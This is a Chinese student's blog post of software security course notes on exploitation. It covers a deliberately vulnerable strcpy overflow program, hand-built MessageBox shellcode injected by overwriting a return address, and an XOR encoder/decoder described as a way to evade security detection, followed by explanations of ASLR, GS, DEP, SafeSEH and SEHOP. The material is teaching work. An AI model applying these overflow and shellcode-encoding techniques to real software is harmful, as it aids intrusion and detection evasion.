<!DOCTYPE html>



  


<html class="theme-next pisces use-motion" lang="en">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT" />










<meta name="description" content="第五章 漏洞利用漏洞利用概念​    漏洞利用（exploit）是指针对已有的漏洞，根据漏洞的类型和特点而采取相应的技术方案，进行尝试性或实质性的攻击，有漏洞不一定就有Exploit（利用），但是有Exploit就肯定有漏洞 ​    漏洞利用的手段是利用shellcode来植入进程，造成漏洞的利用；漏洞利用的核心就是利用程序漏洞去劫持进程的控制权，实现控制流劫持，以便执行植入的shellcode">
<meta property="og:type" content="article">
<meta property="og:title" content="软件安全笔记Chapter5">
<meta property="og:url" content="https://luhaozhhhe.github.io/2024/11/05/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0Chapter5/index.html">
<meta property="og:site_name" content="Welcome To Luhaozhhhe&#39;s Blog!">
<meta property="og:description" content="第五章 漏洞利用漏洞利用概念​    漏洞利用（exploit）是指针对已有的漏洞，根据漏洞的类型和特点而采取相应的技术方案，进行尝试性或实质性的攻击，有漏洞不一定就有Exploit（利用），但是有Exploit就肯定有漏洞 ​    漏洞利用的手段是利用shellcode来植入进程，造成漏洞的利用；漏洞利用的核心就是利用程序漏洞去劫持进程的控制权，实现控制流劫持，以便执行植入的shellcode">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://luhaozhhhe.github.io/images/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8/555.png">
<meta property="og:image" content="https://luhaozhhhe.github.io/images/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-12%20094427.png">
<meta property="og:image" content="https://luhaozhhhe.github.io/images/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8/%E5%9B%BE%E7%89%8799.png">
<meta property="og:image" content="https://luhaozhhhe.github.io/images/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8/%E5%9B%BE%E7%89%87134.png">
<meta property="og:image" content="https://luhaozhhhe.github.io/images/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-18%20233317.png">
<meta property="article:published_time" content="2024-11-05T03:07:23.000Z">
<meta property="article:modified_time" content="2024-11-05T14:35:15.052Z">
<meta property="article:author" content="Luhaozhhhe">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://luhaozhhhe.github.io/images/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8/555.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '',
    scheme: 'Pisces',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideDownBigOut"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>






  <link rel="canonical" href="https://luhaozhhhe.github.io/2024/11/05/软件安全笔记Chapter5/"/>





  <title>软件安全笔记Chapter5 | Welcome To Luhaozhhhe's Blog!</title>
  








<meta name="generator" content="Hexo 7.3.0"></head>

<body itemscope itemtype="http://schema.org/WebPage" lang="en">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Welcome To Luhaozhhhe's Blog!</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">NKUSEer小菜鸡一枚，记录学习笔记、CTF竞赛、学习心得等内容~</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            About
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            Tags
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            Categories
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            Archives
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://luhaozhhhe.github.io/2024/11/05/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0Chapter5/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Welcome To Luhaozhhhe's Blog!">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">软件安全笔记Chapter5</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2024-11-05T11:07:23+08:00">
                2024-11-05
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index">
                    <span itemprop="name">课程笔记</span>
                  </a>
                </span>

                
                
                  , 
                
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8/" itemprop="url" rel="index">
                    <span itemprop="name">软件安全</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          
            <span class="post-meta-divider">|</span>
            <span class="page-pv"><i class="fa fa-file-o"></i>
            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
            </span>
          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h1 id="第五章-漏洞利用"><a href="#第五章-漏洞利用" class="headerlink" title="第五章 漏洞利用"></a>第五章 漏洞利用</h1><h2 id="漏洞利用概念"><a href="#漏洞利用概念" class="headerlink" title="漏洞利用概念"></a>漏洞利用概念</h2><p>​    漏洞利用（exploit）是指针对已有的漏洞，根据漏洞的类型和特点而采取相应的技术方案，进行尝试性或实质性的攻击，有漏洞不一定就有Exploit（利用），但是有Exploit就肯定有漏洞</p>
<p>​    漏洞利用的手段是利用shellcode来植入进程，造成漏洞的利用；漏洞利用的核心就是利用程序漏洞去劫持进程的控制权，实现控制流劫持，以便执行植入的shellcode或者达到其它的攻击目的</p>
<p>Exploit的结构：</p>
<p>Payload：能实现特定目标的Exploit的有效载荷</p>
<p>shellcode：执行恶意功能的代码</p>
<p>​    将漏洞利用过程比作导弹发射的过程：Exploit、payload和shellcode分别是导弹发射装置、导弹和弹头。Exploit是导弹发生装置，针对目标发射导弹（payload）；导弹到达目标之后，释放实际危害的弹头（类似shellcode）爆炸；导弹除了弹头之外的其余部分用来实现对目标进行定位追踪、对弹头引爆等功能，在漏洞利用中，对应payload的非shellcode的部分</p>
<p>​    <strong>Exploit是指利用漏洞进行攻击的动作；Shellcode用来实现具体的功能；Payload除了包含shellcode之外，还需要考虑如何触发漏洞并让系统或者程序去执行shellcode</strong></p>
<h2 id="覆盖临接变量示例"><a href="#覆盖临接变量示例" class="headerlink" title="覆盖临接变量示例"></a>覆盖临接变量示例</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REGCODE <span class="string">&quot;12345678&quot;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">verify</span> <span class="params">(<span class="type">char</span> * code)</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> flag;</span><br><span class="line">	<span class="type">char</span> buffer[<span class="number">44</span>];</span><br><span class="line">	flag=<span class="built_in">strcmp</span>(REGCODE, code);</span><br><span class="line">	<span class="built_in">strcpy</span>(buffer, code);</span><br><span class="line">	<span class="keyword">return</span> flag; </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> vFlag=<span class="number">0</span>;</span><br><span class="line">	<span class="type">char</span> regcode[<span class="number">1024</span>];</span><br><span class="line">	FILE *fp;</span><br><span class="line">	<span class="built_in">LoadLibrary</span>(<span class="string">&quot;user32.dll&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (!(fp=<span class="built_in">fopen</span>(<span class="string">&quot;reg.txt&quot;</span>,<span class="string">&quot;rw+&quot;</span>)))   <span class="built_in">exit</span>(<span class="number">0</span>); </span><br><span class="line">	<span class="built_in">fscanf</span>(fp,<span class="string">&quot;%s&quot;</span>, regcode);</span><br><span class="line">	vFlag=<span class="built_in">verify</span>(regcode);</span><br><span class="line">	<span class="keyword">if</span> (vFlag)   </span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;wrong regcode!&quot;</span>);</span><br><span class="line">	<span class="keyword">else</span>   </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;passed!&quot;</span>); </span><br><span class="line">	<span class="built_in">fclose</span>(fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​    verify函数的缓冲区只有44个字节，对应的栈帧如下所示</p>
<p><img src="/images/软件安全/555.png" alt=""></p>
<p>​    所以，我们利用溢出变量来覆盖临接变量，实现控制流的劫持</p>
<p>​    我们只需要淹没flag的状态位就可以了，输入buffer44个字节和1个字节的整数0，就可以将flag赋值为0了，这样就完成了对程序的破解</p>
<h2 id="Shellcode代码植入示例"><a href="#Shellcode代码植入示例" class="headerlink" title="Shellcode代码植入示例"></a>Shellcode代码植入示例</h2><p>原理图：</p>
<p><img src="/images/软件安全/屏幕截图 2024-04-12 094427.png" alt=""></p>
<p>我们需要做的就是<strong>利用溢出来覆盖返回地址，从而去执行植入的恶意程序</strong></p>
<p>我们在植入shellcode代码前，需要做很多工作</p>
<ul>
<li>弄清输入点，搞清楚他们会被存储到哪里，哪一个输入可能会造成栈溢出</li>
<li>计算函数返回地址的距离缓冲区的偏移并淹没</li>
<li>选择指令的地址，制作出一个有攻击效果的shellcode输入字符串</li>
</ul>
<p>注入的shellcode代码，如果是nop的话需要用90填充，不能使用00，这样的话该语句就被提前中断了</p>
<h2 id="Shellcode编写"><a href="#Shellcode编写" class="headerlink" title="Shellcode编写"></a>Shellcode编写</h2><p>简单的编写方法：</p>
<p>​    第一步，用c语言编写shellcode</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">MessageBox</span>(<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​    第二步，然后我们替换成对应的汇编语言代码，需要对汇编语言进行再加工，将push 0这样的语句改为xor语句</p>
<p>​    然后我们就可以编写汇编语言</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">void main()&#123;</span><br><span class="line">	LoadLibrary(&quot;user32.dll&quot;);//加载user32.dll</span><br><span class="line">_asm</span><br><span class="line">&#123;</span><br><span class="line">	xor ebx,ebx</span><br><span class="line">	push ebx//push 0，push 0的机器代码会出现一个字节的0，因此转换为 push ebx</span><br><span class="line">	push ebx</span><br><span class="line">	push ebx</span><br><span class="line">	push ebx</span><br><span class="line">    mov eax, 77d507eah // 77d507eah是MessageBox函数在系统中的地址</span><br><span class="line">	call eax</span><br><span class="line">&#125;</span><br><span class="line">return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>第三步，我们需要找到地址中的机器码</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> ourshellcode[]=<span class="string">&quot;\x33\xDB\x53\x53\x53\x53\xB8\xEA\x07\xD5\x77\xFF\xD0&quot;</span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">LoadLibrary</span>(<span class="string">&quot;user32.dll&quot;</span>);</span><br><span class="line">	<span class="type">int</span> *ret;</span><br><span class="line">	ret=(<span class="type">int</span>*)&amp;ret<span class="number">+2</span>;</span><br><span class="line">	(*ret)=(<span class="type">int</span>)ourshellcode;</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​    这样的话，我们通过定位到ret后2个位置，相当于是该函数的返回地址，进行覆盖写入shellcode，这样就完成了shellcode代码的注入</p>
<h2 id="Shellcode编码"><a href="#Shellcode编码" class="headerlink" title="Shellcode编码"></a>Shellcode编码</h2><p>必要性：</p>
<ul>
<li><strong>字符集的差异。</strong>应用程序应用平台的不同，可能的字符集会有差异，限制exploit的稳定性。</li>
<li><strong>绕过坏字符。</strong>针对某个应用，可能对某些“坏字符”变形或者截断而破坏exploit，比如strcpy函数对NULL字符的不可接纳性，再比如很多应用在某些处理流程中可能会限制0x0D（\r）、0x0A（\n）或者0x20（空格）字符。</li>
<li><strong>绕过安全防护检测。</strong>有很多安全检测工具是根据漏洞相应的exploit脚本特征做的检测，所以变形exploit在一定程度上可以“免杀”</li>
</ul>
<p>一般的编码方法：</p>
<p>​    对于网页的shellcode，一般采用base64编码</p>
<p>​    对于二进制的机器代码的编码，我们可以采用“加壳”的手段，采用自定义编码，比如说xor加密，简单的加密等。或者说，构造一个解码程序放在shellcode开始执行的地方，完成对其的编码或者解码；当exploit成功后，shellcode顶端的代码首先执行。将shellcode原来的样子还原出来</p>
<p><strong>异或编码</strong></p>
<p><strong>编码程序：</strong>是独立的。是在生成shellcode的编码阶段使用。将shellcode代码输入后，输出异或后的shellcode编码</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">encoder</span><span class="params">(<span class="type">char</span>* input, <span class="type">unsigned</span> <span class="type">char</span> key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>, len = <span class="number">0</span>;     </span><br><span class="line">    len = <span class="built_in">strlen</span>(input);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> * output =  (<span class="type">unsigned</span> <span class="type">char</span> *)<span class="built_in">malloc</span>(len + <span class="number">1</span>);    	</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i&lt;len; i++)</span><br><span class="line">        output[i] = input[i] ^ key; </span><br><span class="line">    ……输出到文件中….</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">char</span> sc[]=“<span class="number">0xAE</span>………………………<span class="number">0x90</span>”;</span><br><span class="line">    <span class="built_in">encoder</span>(sc, <span class="number">0x44</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>解码程序：</strong>是shellcode的一部分。下面的解码程序中，默认EAX在shellcode开始时对准shellcode起始位置，程序将每次将shellcode的代码异或特定key（0x44）后重新覆盖原先shellcode的代码。末尾，放一个空指令0x90作为结束符</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">        add eax, 0x14 ;  越过decoder记录shellcode起始地址,eax记录当前shellcode开始地址</span><br><span class="line">        xor ecx, ecx</span><br><span class="line">    decode_loop:</span><br><span class="line">        mov bl, [eax + ecx]</span><br><span class="line">        xor bl, 0x44             ;用0x44作为key</span><br><span class="line">        mov [eax + ecx], bl</span><br><span class="line">        inc ecx</span><br><span class="line">        cmp bl, 0x90             ;末尾放一个0x90作为结束符</span><br><span class="line">        jne decode_loop</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​    那么如何获取代码当前的地址呢？</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">int main(int argc, char const *argv[])</span><br><span class="line">&#123;</span><br><span class="line">    unsigned   int   temp;    </span><br><span class="line">    __asm&#123;</span><br><span class="line">        call lable;</span><br><span class="line">       lable:</span><br><span class="line">        pop eax;</span><br><span class="line">        mov temp,eax;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt;temp &lt;&lt;endl;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​    重点是call开始的三句话，首先执行lable函数，功能是将eax做pop操作，就是将eax寄存器的位置抬升了一位，然后将eax的值赋给temp并输出</p>
<p>​    <strong>实际上，call指令会执行push EIP，eip的值就是下一条指令pop EAX的地址，pop EAX会将栈顶的EIP出栈，保存到EAX中</strong>，所以EAX指向的就是pop EAX的地址，从14到了15（因为抬升了一位）</p>
<p>最终的shellcode如下所示</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">int main()&#123;</span><br><span class="line">   __asm  &#123;</span><br><span class="line">     call lable; </span><br><span class="line">     lable: pop eax; </span><br><span class="line">        add eax, 0x15            ;越过decoder记录shellcode起始地址</span><br><span class="line">        xor ecx, ecx</span><br><span class="line">    decode_loop:</span><br><span class="line">        mov bl, [eax + ecx]</span><br><span class="line">        xor bl, 0x44             ;用0x44作为key</span><br><span class="line">        mov [eax + ecx], bl</span><br><span class="line">        inc ecx</span><br><span class="line">        cmp bl, 0x90             ;末尾放一个0x90作为结束符</span><br><span class="line">        jne decode_loop </span><br><span class="line">    &#125; </span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>后面跟上自己的编码就可以利用shellcode了</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> ourshellcode[]=<span class="string">&quot;\xE8\x00\x00\x00\x00\x58\x83\xC0\x15\x33\xC9\x8A\x1C\x08\x80\xF3\x44\x88\x1C\x08\x41\x80\xFB\x90\x75\xF1\x77\x9f\x17\x2c\x36\x28\x20\x64\x2c\x2b\x64\x33\x2b\x2c\x2c\x21\x28\x28\xcf\x80\x17\x14\x14\x17\xfc\xae\x43\x91\x33\xbb\x94\xd4&quot;</span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">LoadLibrary</span>(<span class="string">&quot;user32.dll&quot;</span>);</span><br><span class="line">	<span class="type">int</span> *ret;</span><br><span class="line">	ret=(<span class="type">int</span>*)&amp;ret<span class="number">+2</span>;</span><br><span class="line">	(*ret)=(<span class="type">int</span>)ourshellcode;</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Windows安全防护技术"><a href="#Windows安全防护技术" class="headerlink" title="Windows安全防护技术"></a>Windows安全防护技术</h2><h3 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h3><p>​    <strong>地址空间分布随机化</strong>将系统关键地址随机化，使得攻击者无法获得需要跳转的精确地址，一般来说关键地址都存储在$DLL$上，而$GetProcAddress$​函数可以获得DLL中的函数地址</p>
<h3 id="GS-Stack-protection"><a href="#GS-Stack-protection" class="headerlink" title="GS Stack protection"></a>GS Stack protection</h3><p>​    这是一项缓冲区溢出的检测防护技术。选择该模式时，编译器针对函数调用和返回时添加保护和检查功能的代码，在函数被调用时，在缓冲区和函数返回地址增加一个32位的随机数<code>security_cookie</code>，在函数返回时，调用检查函数检查<code>security_cookie</code>的值是否有变化。</p>
<p>​    <code>security_cookie</code>在进程启动时会随机产生，并且它的原始存储地址因Windows操作系统的ASLR机制也是随机存放的，攻击者无法对<code>security_cookie</code>进行篡改，当发生栈缓冲区溢出攻击时，对返回地址或其他指针进行覆盖的同时，会覆盖<code>security_cookie</code>的值，因此在函数调用结束返回时，对<code>security_cookie</code>进行检查就会发现它的值变化了，从而发现缓冲区溢出的操作</p>
<p>​    GS技术能够很好的防范栈的缓冲区溢出攻击。</p>
<h3 id="DEP"><a href="#DEP" class="headerlink" title="DEP"></a>DEP</h3><p>​    数据执行保护DEP($data ~execute~ prevention$)技术可以限制内存堆栈区的代码为不可执行状态，从而防范溢出后代码的执行。启用DEP机制后，DEP机制将这些敏感区域设置不可执行的non-executable标志位，因此在溢出后即使跳转到恶意代码的地址，恶意代码也将无法运行，从而有效地阻止了缓冲区溢出攻击的执行。</p>
<ul>
<li>软件DEP：编译器提供了一个链接标志/NXCOMPAT，可以在生成目标应用程序的时候使程序启用DEP保护</li>
<li>硬件DEP：需要CPU的支持,需要CPU在页表增加一个保护位NX(no execute)，来控制页面是否可执行</li>
</ul>
<h3 id="SafeSEH"><a href="#SafeSEH" class="headerlink" title="SafeSEH"></a>SafeSEH</h3><p>​    SEH（Structured Exception Handler）是Windows异常处理机制所采用的重要数据结构链表。程序设计者可以根据自身需要，定义程序发生各种异常时相应的处理函数，保存在SEH中。</p>
<p>​    SafeSEH就是一项保护SEH函数不被非法利用的技术。微软在编译器中加入了/SafeSEH选项,采用该选项编译的程序将PE文件中所有合法的SEH异常处理函数的地址解析出来制成一张SEH函数表，放在PE文件的数据块中,用于异常处理时候进行匹配检查。</p>
<p>​    在该PE文件被加载时，系统读出该SEH函数表的地址，使用内存中的一个随机数加密，将<strong>加密后的SEH函数表地址、模块的基址、模块的大小、合法SEH函数</strong>的个数等信息，放入<strong>ntdll.dll的SEHIndex结构中</strong>。在PE文件运行中，如果需要调用异常处理函数，系统会调用加解密函数解密从而获得SEH函数表地址，然后针对程序的每个异常处理函数检查是否在合法的SEH函数表中，如果没有则说明该函数非法，将终止异常处理。接着要<strong>检查异常处理句柄是否在栈上，如果在栈上也将停止异常处理</strong>。这两个检测可以防止在堆上伪造异常链和把shellcode放置在栈上的情况，最后还要检测异常处理函数句柄的有效性。</p>
<h3 id="SEHOP"><a href="#SEHOP" class="headerlink" title="SEHOP"></a>SEHOP</h3><p>​    结构化异常处理覆盖保护SEHOP（Structured Exception Handler Overwrite Protection）是微软针对SEH攻击提出的一种安全防护方案</p>
<p>​    SEHOP的核心是检测程序栈中的<strong>所有SEH结构链表的完整性</strong>，来判断应用程序是否受到了SEH攻击</p>
<p>SEHOP针对下列条件进行检测，包括：</p>
<ol>
<li>SEH结构都必须在栈上，最后一个SEH结构也必须在栈上；</li>
<li>所有的SEH结构都必须是4字节对齐的；</li>
<li><strong>SEH结构中异常处理函数的句柄handle（即处理函数地址）必须不在栈上</strong>；</li>
<li>最后一个SEH结构的handle必须是ntdll!FinalExceptionHandler函数F等</li>
</ol>
